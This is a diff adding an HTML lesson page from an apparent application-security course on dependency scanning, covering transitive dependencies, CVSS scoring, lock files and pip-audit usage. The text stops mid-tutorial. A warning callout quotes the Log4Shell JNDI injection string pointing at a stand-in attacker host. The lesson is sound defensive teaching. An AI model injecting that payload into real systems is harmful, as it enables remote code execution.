@@ -1,0 +1,1224 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AppSec Engineer — Lesson 14: Dependency Scanning</title>
+<link href="https://fonts.googleapis.com/css2?family=Nunito:wght@300;400;500;600;700;800;900&family=JetBrains+Mono:wght@400;500;600;700&family=Cormorant+Garamond:ital,wght@0,600;0,700;1,600&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#07090f;--surface:#0c0f1a;--surface2:#111525;--surface3:#172035;
+  --border:#1c2438;--border2:#253050;--ink:#e0e8ff;--ink2:#7a8ab0;--ink3:#35405a;
+  --accent:#38bdf8;--accent-bg:rgba(56,189,248,0.07);
+  --red:#f87171;--red-bg:rgba(248,113,113,0.08);
+  --orange:#fb923c;--orange-bg:rgba(251,146,60,0.08);
+  --yellow:#fbbf24;--yellow-bg:rgba(251,191,36,0.08);
+  --green:#34d399;--green-bg:rgba(52,211,153,0.08);
+  --purple:#a78bfa;--purple-bg:rgba(167,139,250,0.08);
+  --teal:#2dd4bf;--teal-bg:rgba(45,212,191,0.08);
+  --pink:#f472b6;--pink-bg:rgba(244,114,182,0.08);
+  --code-bg:#040508;
+}
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{background:var(--bg);color:var(--ink);font-family:'Nunito',sans-serif;font-size:15px;line-height:1.8;}
+.sidebar{position:fixed;left:0;top:0;bottom:0;width:252px;background:var(--surface);border-right:1px solid var(--border);overflow-y:auto;z-index:100;}
+.sb-brand{padding:1.4rem 1.2rem 1rem;border-bottom:1px solid var(--border);}
+.sb-badge{font-family:'JetBrains Mono',monospace;font-size:9px;background:var(--accent);color:#000;padding:2px 8px;border-radius:2px;letter-spacing:.12em;display:inline-block;margin-bottom:7px;text-transform:uppercase;font-weight:700;}
+.sb-brand h2{font-size:13px;font-weight:400;color:var(--ink3);line-height:1.4;}
+.sb-sect{padding:.7rem 1.2rem .2rem;font-size:9px;font-weight:700;letter-spacing:.15em;text-transform:uppercase;color:var(--ink3);margin-top:.25rem;opacity:.55;}
+.nav-item{display:flex;align-items:center;gap:9px;padding:.38rem 1.2rem;cursor:pointer;border-left:2px solid transparent;font-size:12.5px;color:var(--ink3);text-decoration:none;transition:all .15s;}
+.nav-item:hover{color:var(--ink2);background:var(--surface2);}
+.nav-item.done{color:var(--ink3);}
+.nav-item.active{color:var(--accent);border-left-color:var(--accent);background:var(--accent-bg);}
+.nav-item .num{font-family:'JetBrains Mono',monospace;font-size:10px;min-width:22px;opacity:.3;}
+.nav-item.active .num{opacity:1;color:var(--accent);}
+.main{margin-left:252px;}
+.topbar{position:sticky;top:0;background:rgba(7,9,15,.96);backdrop-filter:blur(14px);border-bottom:1px solid var(--border);padding:.65rem 2.5rem;display:flex;align-items:center;justify-content:space-between;z-index:50;}
+.bc{font-family:'JetBrains Mono',monospace;font-size:11px;color:var(--ink3);}
+.bc span{color:var(--accent);}
+.top-badge{font-family:'JetBrains Mono',monospace;font-size:10px;padding:3px 10px;background:var(--surface2);border:1px solid var(--border);color:var(--ink2);border-radius:2px;}
+.content{padding:3rem 2.5rem 5rem;max-width:960px;}
+.hero{margin-bottom:3.5rem;padding-bottom:2.5rem;border-bottom:1px solid var(--border);}
+.hero-meta{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:1rem;}
+.tag{font-family:'JetBrains Mono',monospace;font-size:10px;padding:3px 10px;border-radius:2px;font-weight:600;letter-spacing:.04em;}
+.t-beg{background:var(--green-bg);color:var(--green);border:1px solid rgba(52,211,153,.2);}
+.t-frm{background:var(--accent-bg);color:var(--accent);border:1px solid rgba(56,189,248,.2);}
+.t-time{background:var(--purple-bg);color:var(--purple);border:1px solid rgba(167,139,250,.2);}
+.hero h1{font-family:'Cormorant Garamond',serif;font-size:3.6rem;font-weight:700;line-height:1.05;color:var(--ink);margin-bottom:.85rem;}
+.hero h1 .hl{color:var(--accent);}
+.hero-sub{font-size:14.5px;color:var(--ink2);max-width:660px;line-height:1.8;margin-bottom:1.75rem;}
+.level-strip{display:grid;grid-template-columns:repeat(3,1fr);gap:1px;background:var(--border);border:1px solid var(--border);border-radius:6px;overflow:hidden;}
+.lv-cell{background:var(--surface);padding:.9rem 1rem;}
+.lv-pip{width:8px;height:8px;border-radius:50%;margin-bottom:7px;}
+.lv-label{font-family:'JetBrains Mono',monospace;font-size:9px;letter-spacing:.12em;text-transform:uppercase;color:var(--ink3);margin-bottom:3px;}
+.lv-title{font-size:13px;font-weight:700;color:var(--ink);margin-bottom:2px;}
+.lv-desc{font-size:12px;color:var(--ink3);line-height:1.5;}
+.section{margin-bottom:3.5rem;}
+.eyebrow{font-family:'JetBrains Mono',monospace;font-size:10px;text-transform:uppercase;letter-spacing:.15em;color:var(--accent);margin-bottom:5px;font-weight:700;}
+.sec-title{font-family:'Cormorant Garamond',serif;font-size:2rem;font-weight:700;color:var(--ink);line-height:1.2;margin-bottom:.35rem;}
+.sec-sub{font-size:14px;color:var(--ink2);max-width:660px;line-height:1.75;margin-bottom:1.5rem;}
+.callout{border-radius:5px;padding:.9rem 1.1rem;margin:1rem 0;display:flex;gap:10px;align-items:flex-start;border-left:3px solid;}
+.cl-warn{background:var(--red-bg);border-color:var(--red);}
+.cl-info{background:var(--accent-bg);border-color:var(--accent);}
+.cl-tip{background:var(--green-bg);border-color:var(--green);}
+.cl-note{background:var(--yellow-bg);border-color:var(--yellow);}
+.cl-purple{background:var(--purple-bg);border-color:var(--purple);}
+.cl-teal{background:var(--teal-bg);border-color:var(--teal);}
+.cl-pink{background:var(--pink-bg);border-color:var(--pink);}
+.cl-icon{font-size:15px;flex-shrink:0;margin-top:2px;}
+.cl-text{font-size:13.5px;color:var(--ink2);line-height:1.7;}
+.cl-text strong{color:var(--ink);}
+.cl-text code{font-family:'JetBrains Mono',monospace;font-size:11.5px;background:rgba(255,255,255,.06);padding:1px 5px;border-radius:3px;color:var(--accent);}
+pre{background:var(--code-bg);color:#dce4f5;border-radius:6px;padding:1.25rem;font-family:'JetBrains Mono',monospace;font-size:12px;line-height:1.8;overflow-x:auto;margin:.85rem 0;position:relative;border:1px solid var(--border);}
+.ctag{position:absolute;top:10px;right:12px;font-family:'JetBrains Mono',monospace;font-size:9px;color:var(--ink3);text-transform:uppercase;letter-spacing:.1em;}
+.ck{color:#c084fc;}.cf{color:#7dd3fc;}.cs{color:#86efac;}.cm{color:#2a3550;}.cv{color:#fcd34d;}.ce{color:#fb923c;}.cr{color:#f87171;}.cg{color:#4ade80;}.ct{color:#2dd4bf;}.cw{color:#f9a8d4;}.ca{color:#38bdf8;}
+.lb{display:block;background:rgba(248,113,113,.09);border-left:2px solid #ef4444;margin:0 -1.25rem;padding:0 1.25rem;}
+.lg{display:block;background:rgba(74,222,128,.07);border-left:2px solid #22c55e;margin:0 -1.25rem;padding:0 1.25rem;}
+.lw{display:block;background:rgba(252,211,77,.07);border-left:2px solid #f59e0b;margin:0 -1.25rem;padding:0 1.25rem;}
+table{width:100%;border-collapse:collapse;font-size:13px;margin:1rem 0;}
+th{padding:.55rem .9rem;text-align:left;background:var(--surface2);border:1px solid var(--border);font-family:'JetBrains Mono',monospace;font-size:9px;text-transform:uppercase;letter-spacing:.08em;color:var(--ink3);}
+td{padding:.55rem .9rem;border:1px solid var(--border);color:var(--ink2);line-height:1.5;vertical-align:top;}
+tr:hover td{background:var(--surface2);}
+.panel{background:var(--surface);border:1px solid var(--border);border-radius:6px;overflow:hidden;margin-bottom:.75rem;}
+.panel-h{display:flex;align-items:center;gap:10px;padding:.9rem 1.1rem;cursor:pointer;transition:background .15s;user-select:none;}
+.panel-h:hover{background:var(--surface2);}
+.panel-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0;}
+.panel-title{font-size:13.5px;font-weight:700;flex:1;color:var(--ink);}
+.panel-sub{font-size:12px;color:var(--ink3);}
+.panel-tog{color:var(--ink3);font-size:13px;transition:transform .2s;}
+.panel.open .panel-tog{transform:rotate(180deg);}
+.panel-body{display:none;padding:0 1.1rem 1.1rem;border-top:1px solid var(--border);}
+.panel.open .panel-body{display:block;}
+.panel-body h4{font-family:'JetBrains Mono',monospace;font-size:10px;text-transform:uppercase;letter-spacing:.1em;color:var(--ink3);margin:1rem 0 .5rem;font-weight:700;}
+.panel-body p{font-size:13.5px;color:var(--ink2);line-height:1.75;margin-top:.6rem;}
+.tool-tabs{border:1px solid var(--border);border-radius:6px;overflow:hidden;margin:1.25rem 0;}
+.tool-tab-bar{display:flex;background:var(--surface2);border-bottom:1px solid var(--border);flex-wrap:wrap;}
+.ttab{padding:.55rem 1rem;font-family:'JetBrains Mono',monospace;font-size:11px;font-weight:600;cursor:pointer;color:var(--ink3);border-right:1px solid var(--border);transition:all .15s;user-select:none;}
+.ttab:hover{color:var(--ink2);}
+.ttab.active{background:var(--surface);color:var(--accent);border-bottom:2px solid var(--accent);}
+.tool-pane{display:none;padding:1.25rem;}
+.tool-pane.active{display:block;}
+.two-col{display:grid;grid-template-columns:1fr 1fr;gap:1rem;margin:1rem 0;}
+.cb{background:var(--red-bg);border:1px solid rgba(248,113,113,.15);border-radius:6px;padding:1rem;}
+.cg-box{background:var(--green-bg);border:1px solid rgba(52,211,153,.15);border-radius:6px;padding:1rem;}
+.cmp-l{font-family:'JetBrains Mono',monospace;font-size:9px;text-transform:uppercase;letter-spacing:.12em;font-weight:700;margin-bottom:.6rem;}
+.cb .cmp-l{color:var(--red);}
+.cg-box .cmp-l{color:var(--green);}
+.pill{font-size:11px;padding:3px 9px;border-radius:2px;font-family:'JetBrains Mono',monospace;font-weight:600;}
+.pr{background:var(--red-bg);color:var(--red);border:1px solid rgba(248,113,113,.2);}
+.pg{background:var(--green-bg);color:var(--green);border:1px solid rgba(52,211,153,.2);}
+.py{background:var(--yellow-bg);color:var(--yellow);border:1px solid rgba(251,191,36,.2);}
+.pb{background:var(--accent-bg);color:var(--accent);border:1px solid rgba(56,189,248,.2);}
+.pp{background:var(--purple-bg);color:var(--purple);border:1px solid rgba(167,139,250,.2);}
+.pt{background:var(--teal-bg);color:var(--teal);border:1px solid rgba(45,212,191,.2);}
+.pk{background:var(--pink-bg);color:var(--pink);border:1px solid rgba(244,114,182,.2);}
+.pill-row{display:flex;flex-wrap:wrap;gap:6px;margin:.5rem 0;}
+.rw-box{background:var(--surface2);border:1px solid var(--border);border-radius:5px;padding:1rem 1.1rem;margin:.85rem 0;}
+.rw-label{font-family:'JetBrains Mono',monospace;font-size:9px;text-transform:uppercase;letter-spacing:.12em;color:var(--red);margin-bottom:5px;font-weight:700;}
+.rw-box p{font-size:13px;color:var(--ink2);line-height:1.7;}
+.quiz-block{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:1.25rem;margin-bottom:1rem;}
+.quiz-q{font-size:14.5px;font-weight:700;color:var(--ink);margin-bottom:.85rem;line-height:1.55;}
+.quiz-opts{display:flex;flex-direction:column;gap:7px;}
+.qo{padding:.65rem 1rem;border:1px solid var(--border);border-radius:4px;cursor:pointer;font-size:13.5px;color:var(--ink2);background:var(--surface2);transition:all .15s;}
+.qo:hover{border-color:var(--accent);color:var(--ink);}
+.qo.correct{border-color:var(--green);color:var(--green);background:var(--green-bg);cursor:default;}
+.qo.wrong{border-color:var(--red);color:var(--red);background:var(--red-bg);cursor:default;}
+.quiz-exp{font-size:13px;color:var(--ink2);line-height:1.7;padding:.75rem 1rem;background:var(--surface2);border-radius:4px;border-left:3px solid var(--green);display:none;margin-top:.5rem;}
+.quiz-exp.show{display:block;}
+.challenge{background:var(--surface);border:1px solid var(--accent);border-radius:10px;padding:2rem;margin:3rem 0;position:relative;overflow:hidden;}
+.challenge::before{content:'';position:absolute;top:-60px;right:-60px;width:220px;height:220px;background:radial-gradient(circle,var(--accent-bg) 0%,transparent 70%);pointer-events:none;}
+.ch-ey{font-family:'JetBrains Mono',monospace;font-size:9px;text-transform:uppercase;letter-spacing:.15em;color:var(--accent);margin-bottom:.5rem;}
+.ch h3{font-family:'Cormorant Garamond',serif;font-size:1.6rem;font-weight:700;color:var(--ink);margin-bottom:.7rem;}
+.ch-desc{font-size:13.5px;color:var(--ink2);line-height:1.75;margin-bottom:1.25rem;}
+.scenario{background:var(--surface2);border:1px solid var(--border);border-radius:5px;padding:1rem 1.1rem;margin-bottom:1.25rem;}
+.scenario p{font-size:13px;color:var(--ink2);line-height:1.75;}
+.scenario strong{color:var(--ink);}
+.challenge textarea{width:100%;min-height:200px;background:var(--code-bg);border:1px solid var(--border);border-radius:4px;padding:1rem;font-family:'JetBrains Mono',monospace;font-size:12px;color:var(--ink);resize:vertical;outline:none;transition:border-color .2s;margin-bottom:1rem;}
+.challenge textarea:focus{border-color:var(--accent);}
+.challenge textarea::placeholder{color:var(--ink3);}
+.btn-row{display:flex;gap:10px;flex-wrap:wrap;}
+.btn{padding:9px 20px;border-radius:4px;font-size:13px;font-family:'Nunito',sans-serif;font-weight:700;cursor:pointer;border:1px solid;transition:all .15s;}
+.btn-p{background:var(--accent);color:#000;border-color:var(--accent);}
+.btn-p:hover{background:#0ea5e9;}
+.btn-g{background:transparent;color:var(--ink2);border-color:var(--border2);}
+.btn-g:hover{border-color:var(--accent);color:var(--ink);}
+.ch-fb{margin-top:1rem;padding:1rem 1.1rem;border-radius:5px;font-size:13.5px;line-height:1.7;display:none;}
+.ch-fb.show{display:block;}
+.ch-fb.good{background:var(--green-bg);border:1px solid rgba(52,211,153,.25);color:var(--green);}
+.ch-fb.hint{background:var(--yellow-bg);border:1px solid rgba(251,191,36,.25);color:var(--yellow);}
+.ch-fb.reveal{background:var(--surface2);border:1px solid var(--border);color:var(--ink2);}
+.nav-footer{display:flex;justify-content:space-between;margin-top:4rem;padding-top:2rem;border-top:1px solid var(--border);}
+.nf-btn{padding:.85rem 1.5rem;border:1px solid var(--border);border-radius:4px;font-size:13px;cursor:pointer;background:var(--surface);color:var(--ink2);text-align:left;transition:all .15s;text-decoration:none;display:block;}
+.nf-btn:hover{border-color:var(--accent);}
+.nf-btn.next{background:var(--accent);color:#000;border-color:var(--accent);text-align:right;}
+.nf-btn.next:hover{background:#0ea5e9;}
+.nf-dir{font-family:'JetBrains Mono',monospace;font-size:9px;text-transform:uppercase;letter-spacing:.1em;color:var(--ink3);display:block;margin-bottom:3px;}
+.nf-btn.next .nf-dir{color:rgba(0,0,0,.4);}
+.nf-title{font-weight:700;display:block;}
+code{font-family:'JetBrains Mono',monospace;font-size:12px;background:rgba(255,255,255,.06);padding:1px 5px;border-radius:3px;color:var(--accent);}
+pre code{background:none;padding:0;color:inherit;font-size:inherit;}
+::-webkit-scrollbar{width:5px;height:5px;}
+::-webkit-scrollbar-track{background:var(--bg);}
+::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px;}
+@media(max-width:860px){.sidebar{display:none;}.main{margin-left:0;}.content{padding:1.5rem 1.1rem 3rem;}.level-strip,.two-col{grid-template-columns:1fr;}}
+</style>
+</head>
+<body>
+<nav class="sidebar">
+  <div class="sb-brand"><div class="sb-badge">AppSec Engineer</div><h2>Application Security<br>Learning Path</h2></div>
+  <div class="sb-sect">Module 1 &mdash; Foundations</div>
+  <a class="nav-item done" href="#"><span class="num">01</span>OWASP Top 10 2021</a>
+  <a class="nav-item done" href="#"><span class="num">02</span>Secure SDLC</a>
+  <a class="nav-item done" href="#"><span class="num">03</span>Threat Modeling</a>
+  <div class="sb-sect">Module 2 &mdash; Testing Tools</div>
+  <a class="nav-item done" href="#"><span class="num">04</span>SAST</a>
+  <a class="nav-item done" href="#"><span class="num">05</span>DAST</a>
+  <a class="nav-item done" href="#"><span class="num">06</span>SCA</a>
+  <a class="nav-item done" href="#"><span class="num">07</span>IAST &amp; RASP</a>
+  <div class="sb-sect">Module 3 &mdash; API Security</div>
+  <a class="nav-item done" href="#"><span class="num">08</span>OWASP API Top 10</a>
+  <a class="nav-item done" href="#"><span class="num">09</span>API Security Testing</a>
+  <a class="nav-item done" href="#"><span class="num">10</span>GraphQL Security</a>
+  <div class="sb-sect">Module 4 &mdash; DevSecOps</div>
+  <a class="nav-item done" href="#"><span class="num">11</span>DevSecOps Pipeline</a>
+  <a class="nav-item done" href="#"><span class="num">12</span>Secrets Management</a>
+  <a class="nav-item done" href="#"><span class="num">13</span>Container Security</a>
+  <a class="nav-item active" href="#"><span class="num">14</span>Dependency Scanning</a>
+  <a class="nav-item" href="#"><span class="num">15</span>SBOM</a>
+  <div class="sb-sect">Module 5 &mdash; Architecture</div>
+  <a class="nav-item" href="#"><span class="num">16</span>Security Architecture</a>
+  <a class="nav-item" href="#"><span class="num">17</span>Supply Chain Security</a>
+  <a class="nav-item" href="#"><span class="num">18</span>WAF</a>
+  <a class="nav-item" href="#"><span class="num">19</span>Code Review</a>
+  <a class="nav-item" href="#"><span class="num">20</span>RASP</a>
+</nav>
+
+<div class="main">
+<div class="topbar">
+  <div class="bc">appsec-engineer / module-4 / <span>dependency-scanning</span></div>
+  <div class="top-badge">Lesson 14 / 20</div>
+</div>
+<div class="content">
+
+<!-- HERO -->
+<div class="hero">
+  <div class="hero-meta">
+    <span class="tag t-beg">Beginner &rarr; Advanced</span>
+    <span class="tag t-frm">Supply Chain</span>
+    <span class="tag t-time">~65 min</span>
+  </div>
+  <h1>Dependency<br><span class="hl">Scanning</span></h1>
+  <p class="hero-sub">Modern applications are mostly other people's code. The average Python project pulls in 150 transitive dependencies; a typical Node.js app can have thousands. Each one is a potential vulnerability. Dependency scanning &mdash; also called Software Composition Analysis (SCA) &mdash; is the practice of continuously checking every package in your dependency tree against CVE databases, and acting on what you find. This lesson covers the full picture: how dependency graphs work, every major ecosystem scanner, reachability analysis, dependency confusion attacks, license compliance, and a complete automated pipeline.</p>
+  <div class="level-strip">
+    <div class="lv-cell"><div class="lv-pip" style="background:var(--green)"></div><div class="lv-label">Beginner</div><div class="lv-title">Dependency graphs &amp; CVEs</div><div class="lv-desc">Direct vs transitive deps, how CVEs reach you, CVSS scoring, why lock files matter</div></div>
+    <div class="lv-cell"><div class="lv-pip" style="background:var(--yellow)"></div><div class="lv-label">Intermediate</div><div class="lv-title">Scanners by ecosystem</div><div class="lv-desc">pip-audit, npm audit, govulncheck, bundler-audit, dotnet, OWASP Dependency-Check, Snyk in full detail</div></div>
+    <div class="lv-cell"><div class="lv-pip" style="background:var(--red)"></div><div class="lv-label">Advanced</div><div class="lv-title">Reachability, confusion attacks &amp; pipeline</div><div class="lv-desc">Reachability analysis, dependency confusion, license compliance, Dependabot, full GitHub Actions pipeline</div></div>
+  </div>
+</div>
+
+<!-- BEGINNER: DEPENDENCY GRAPHS & CVEs -->
+<div class="section">
+  <div class="eyebrow">&#x1F7E2; Beginner &mdash; Understanding Dependencies</div>
+  <div class="sec-title">Direct dependencies, transitive dependencies, and how vulnerabilities reach you</div>
+  <div class="sec-sub">Before you can scan dependencies, you need to understand what you're scanning: the full dependency graph, not just the packages you explicitly installed.</div>
+
+  <p style="font-size:14.5px;color:var(--ink2);line-height:1.8;margin-bottom:1rem;">When you add <code>Django==4.2.0</code> to your requirements.txt, you get Django. But Django itself depends on <code>sqlparse</code> and <code>asgiref</code>. Those packages have their own dependencies. By the time the full graph resolves, a single direct dependency can pull in dozens of transitive ones &mdash; each of which can carry CVEs you never knowingly chose to include.</p>
+
+  <div class="callout cl-warn">
+    <div class="cl-icon">&#x26A0;&#xFE0F;</div>
+    <div class="cl-text"><strong>Log4Shell (CVE-2021-44228):</strong> The most destructive dependency vulnerability in recent history. Log4j was a transitive dependency in thousands of applications &mdash; teams had no idea they were using it. CVSS 10.0. Remote code execution with a single HTTP request containing <code>${jndi:ldap://attacker.com/exploit}</code> in any logged field (User-Agent, username, even error messages). Exploited within hours of disclosure. The lesson: you are responsible for every package in your dependency tree, not just the ones you installed directly.</div>
+  </div>
+
+  <div class="panel" id="pan-graph">
+    <div class="panel-h" onclick="tp('pan-graph')">
+      <div class="panel-dot" style="background:var(--accent)"></div>
+      <div class="panel-title">How dependency graphs work &mdash; direct vs transitive</div>
+      <div class="panel-sub">Understanding the full tree you are responsible for securing</div>
+      <div class="panel-tog">&#x25BC;</div>
+    </div>
+    <div class="panel-body">
+<pre>
+<span class="cm"># Your requirements.txt (direct dependencies &mdash; 3 packages)</span>
+django==4.2.0
+requests==2.31.0
+celery==5.3.1
+
+<span class="cm"># What actually gets installed (full transitive tree &mdash; 47 packages)</span>
+$ pip install -r requirements.txt
+$ pip list | wc -l
+47
+
+<span class="cm"># Visualise the full dependency tree</span>
+$ pip install pipdeptree
+$ pipdeptree --warn silence
+Django==4.2.0
+  - asgiref [required: &gt;=3.6.0, installed: 3.7.2]
+  - sqlparse [required: &gt;=0.3.1, installed: 0.4.4]
+requests==2.31.0
+  - certifi [required: &gt;=2017.4.17, installed: 2023.7.22]
+  - charset-normalizer [required: &gt;=2, installed: 3.2.0]
+  - idna [required: &gt;=2.5, installed: 3.4]
+  - urllib3 [required: &gt;=1.21.1, installed: 2.0.4]
+celery==5.3.1
+  - amqp [required: &gt;=5.1.1, installed: 5.1.1]
+    - vine [required: &gt;=5.0.0, installed: 5.0.0]
+  - billiard [required: &gt;=4.1.0, installed: 4.1.0]
+  - click [required: &gt;=8.1.2, installed: 8.1.7]
+  - kombu [required: &gt;=5.3.1, installed: 5.3.2]
+    - amqp [required: &gt;=5.1.1, installed: 5.1.1]
+<span class="cm">  ... (many more)</span>
+
+<span class="cm"># urllib3 has a known CVE in some versions &mdash; you are responsible for it
+# even though you only added 'requests' to requirements.txt</span>
+</pre>
+      <h4>Direct vs transitive: the responsibility model</h4>
+      <table>
+        <tr><th>Type</th><th>Example</th><th>You control?</th><th>You're responsible?</th><th>Fix path</th></tr>
+        <tr><td style="font-weight:700;color:var(--accent)">Direct</td><td><code>requests==2.31.0</code> in requirements.txt</td><td>Yes, you chose it</td><td style="color:var(--green)">Yes</td><td>Update version in requirements.txt</td></tr>
+        <tr><td style="font-weight:700;color:var(--yellow)">Transitive (1 hop)</td><td><code>urllib3</code> pulled in by requests</td><td>Indirectly &mdash; by updating requests</td><td style="color:var(--green)">Yes</td><td>Update requests, which updates urllib3</td></tr>
+        <tr><td style="font-weight:700;color:var(--orange)">Transitive (deep)</td><td><code>vine</code> pulled in by celery &rarr; kombu &rarr; amqp &rarr; vine</td><td>Very indirectly</td><td style="color:var(--green)">Yes</td><td>Update celery, pin vine in requirements.txt if needed</td></tr>
+        <tr><td style="font-weight:700;color:var(--red)">Abandoned package</td><td>Direct dep hasn't released a patch</td><td>Partially</td><td style="color:var(--green)">Yes</td><td>Fork and patch, or replace with maintained alternative</td></tr>
+      </table>
+    </div>
+  </div>
+
+  <div class="panel" id="pan-cvss">
+    <div class="panel-h" onclick="tp('pan-cvss')">
+      <div class="panel-dot" style="background:var(--red)"></div>
+      <div class="panel-title">CVSS scoring &mdash; reading a vulnerability report correctly</div>
+      <div class="panel-sub">What CVSS 3.1 scores mean and why raw score is not the only number that matters</div>
+      <div class="panel-tog">&#x25BC;</div>
+    </div>
+    <div class="panel-body">
+      <table>
+        <tr><th>Score range</th><th>Severity</th><th>Example</th><th>Typical SLA</th></tr>
+        <tr><td style="font-weight:700;color:var(--red)">9.0 &ndash; 10.0</td><td style="color:var(--red)">CRITICAL</td><td>Log4Shell (10.0): unauthenticated RCE via network</td><td>Fix within 24&ndash;72 hours</td></tr>
+        <tr><td style="font-weight:700;color:var(--orange)">7.0 &ndash; 8.9</td><td style="color:var(--orange)">HIGH</td><td>Pillow heap overflow: RCE parsing malicious images</td><td>Fix within 7 days</td></tr>
+        <tr><td style="font-weight:700;color:var(--yellow)">4.0 &ndash; 6.9</td><td style="color:var(--yellow)">MEDIUM</td><td>Django path traversal: read arbitrary files if DEBUG=True</td><td>Fix within 30 days</td></tr>
+        <tr><td style="font-weight:700;color:var(--green)">0.1 &ndash; 3.9</td><td style="color:var(--green)">LOW</td><td>certifi: outdated CA bundle (no active exploit)</td><td>Fix in next regular release</td></tr>
+        <tr><td style="font-weight:700;color:var(--ink3)">0.0</td><td style="color:var(--ink3)">NONE</td><td>Informational finding, no security impact</td><td>No action required</td></tr>
+      </table>
+
+      <h4>Why raw CVSS score is not enough</h4>
+      <p>CVSS measures the theoretical severity of a vulnerability in isolation. Your actual risk depends on context. A CVSS 9.8 vulnerability in a package you use only in a background task that never processes user input may be less urgent than a CVSS 6.5 vulnerability in your authentication library. Always consider: is the vulnerable code path actually reachable? Does your deployment model expose the attack vector? Is there a compensating control?</p>
+<pre>
+<span class="cm"># CVSS 3.1 vector breakdown for Log4Shell:</span>
+<span class="cm"># CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H</span>
+<span class="cm">#</span>
+<span class="cm"># AV:N  = Attack Vector Network     → exploitable over the internet</span>
+<span class="cm"># AC:L  = Attack Complexity Low     → no special conditions needed</span>
+<span class="cm"># PR:N  = Privileges Required None  → unauthenticated attacker</span>
+<span class="cm"># UI:N  = User Interaction None     → fully automated exploit possible</span>
+<span class="cm"># S:C   = Scope Changed             → impact beyond vulnerable component</span>
+<span class="cm"># C:H   = Confidentiality High      → full data disclosure</span>
+<span class="cm"># I:H   = Integrity High            → full data modification</span>
+<span class="cm"># A:H   = Availability High         → complete denial of service</span>
+<span class="cm"># = 10.0 CRITICAL</span>
+<span class="cm">#</span>
+<span class="cm"># Contrast: CVSS 7.5 with AV:N but PR:H (requires admin access)</span>
+<span class="cm"># High score, but much harder to exploit in practice</span>
+</pre>
+    </div>
+  </div>
+
+  <div class="panel" id="pan-lockfiles">
+    <div class="panel-h" onclick="tp('pan-lockfiles')">
+      <div class="panel-dot" style="background:var(--yellow)"></div>
+      <div class="panel-title">Lock files &mdash; why you scan the lock file, not the manifest</div>
+      <div class="panel-sub">requirements.txt vs requirements.lock, package.json vs package-lock.json</div>
+      <div class="panel-tog">&#x25BC;</div>
+    </div>
+    <div class="panel-body">
+      <p>Your manifest file (requirements.txt, package.json) specifies your <em>direct</em> dependencies and version ranges. Your lock file (requirements.lock, package-lock.json, poetry.lock) records the exact resolved version of <em>every</em> package in the full transitive tree. Scanning the manifest misses transitive vulnerabilities. Always scan the lock file.</p>
+<pre>
+<span class="cm"># requirements.txt (manifest): specifies ranges, direct deps only</span>
+<span class="lb">django&gt;=4.0,&lt;5.0    <span class="cm"># ← which version of urllib3 does this resolve to?</span></span>
+<span class="lb">requests             <span class="cm"># ← no version pin at all</span></span>
+
+<span class="cm"># requirements.lock (lock file): every package, exact version, hash</span>
+<span class="lg">Django==4.2.3 \</span>
+<span class="lg">    --hash=sha256:a29e...  <span class="cm"># cryptographically verified exact version</span></span>
+<span class="lg">urllib3==2.0.4 \           <span class="cm"># transitive dep, exact version locked</span></span>
+<span class="lg">    --hash=sha256:bce8...</span>
+
+<span class="cm"># Scan the LOCK FILE — it has the full resolved tree</span>
+<span class="lg">$ pip-audit -r requirements.lock   <span class="cm"># scans all 47 packages</span></span>
+<span class="lb">$ pip-audit -r requirements.txt    <span class="cm"># only scans your 3 direct deps</span></span>
+
+<span class="cm"># npm: scan package-lock.json, not package.json</span>
+<span class="lg">$ npm audit                        <span class="cm"># reads package-lock.json automatically</span></span>
+
+<span class="cm"># Poetry: scan poetry.lock</span>
+<span class="lg">$ pip-audit --requirement poetry.lock</span>
+
+<span class="cm"># Go: go.sum is the lock file (scanned by govulncheck)</span>
+<span class="lg">$ govulncheck ./...</span>
+</pre>
+      <div class="callout cl-tip" style="margin-top:.75rem;">
+        <div class="cl-icon">&#x1F4A1;</div>
+        <div class="cl-text"><strong>Commit your lock file:</strong> Lock files belong in version control. They give reproducible builds, make dependency updates explicit and reviewable in PRs, and enable accurate security scanning. Developers who add lock files to .gitignore are causing unnecessary security and reproducibility problems.</div>
+      </div>
+    </div>
+  </div>
+</div>
+<!-- INTERMEDIATE: SCANNERS BY ECOSYSTEM -->
+<div class="section">
+  <div class="eyebrow">&#x1F7E1; Intermediate &mdash; Scanners by Ecosystem</div>
+  <div class="sec-title">The right scanner for every language</div>
+  <div class="sec-sub">Each language ecosystem has purpose-built scanning tools. Generic scanners miss language-specific nuances. Know the canonical tool for each ecosystem you work with.</div>
+
+  <div class="tool-tabs">
+    <div class="tool-tab-bar">
+      <div class="ttab active" onclick="switchTab(this,'t-python')">Python</div>
+      <div class="ttab" onclick="switchTab(this,'t-node')">Node.js</div>
+      <div class="ttab" onclick="switchTab(this,'t-go')">Go</div>
+      <div class="ttab" onclick="switchTab(this,'t-ruby')">Ruby</div>
+      <div class="ttab" onclick="switchTab(this,'t-dotnet')">.NET</div>
+      <div class="ttab" onclick="switchTab(this,'t-odc')">OWASP DC</div>
+    </div>
+
+    <!-- PYTHON -->
+    <div class="tool-pane active" id="t-python">
+      <p style="font-size:13.5px;color:var(--ink2);line-height:1.75;margin-bottom:1rem;"><strong style="color:var(--ink)">pip-audit</strong> is the canonical Python dependency scanner, maintained by the Python Packaging Authority (PyPA). It queries both PyPI Advisory Database and OSV (Open Source Vulnerabilities). Fast, accurate, integrates directly with pip. Free, open source.</p>
+<pre>
+<span class="ctag">Python &mdash; pip-audit</span>
+<span class="cm"># Install</span>
+$ pip install pip-audit
+
+<span class="cm"># Scan current environment</span>
+$ pip-audit
+
+<span class="cm"># Scan a requirements file (use lock file for full coverage)</span>
+$ pip-audit -r requirements.lock
+
+<span class="cm"># JSON output for CI/CD parsing</span>
+$ pip-audit -r requirements.lock --format json -o pip-audit.json
+
+<span class="cm"># Ignore a specific CVE with documented reason</span>
+$ pip-audit -r requirements.lock \
+    --ignore-vuln GHSA-j3f7-7rmc-6wqj  <span class="cm"># false positive: only affects Windows</span>
+
+<span class="cm"># Fix: auto-upgrade packages to patched versions</span>
